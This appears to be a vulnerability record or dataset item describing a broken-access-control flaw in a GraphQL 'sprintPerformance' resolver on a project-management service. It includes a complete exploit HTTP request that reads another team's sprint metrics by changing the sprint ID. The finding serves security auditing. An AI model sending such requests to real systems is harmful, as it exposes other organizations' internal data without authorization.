diagnosis: The sprint performance GraphQL resolver queries sprint metrics using a DataLoader without validating that the authenticated user belongs to the organization or engineering team owning the target sprint. Any authenticated user can enumerate sprint IDs and observe internal team velocity and engineering metrics.
exploit_request:
POST /graphql HTTP/1.1
Host: agile.pmcloud.io
Authorization: Bearer <regular_user_token>
Content-Type: application/json

{"query": "query { sprintPerformance(sprintId: 4402) { sprintId completedPoints velocityScore } }"}
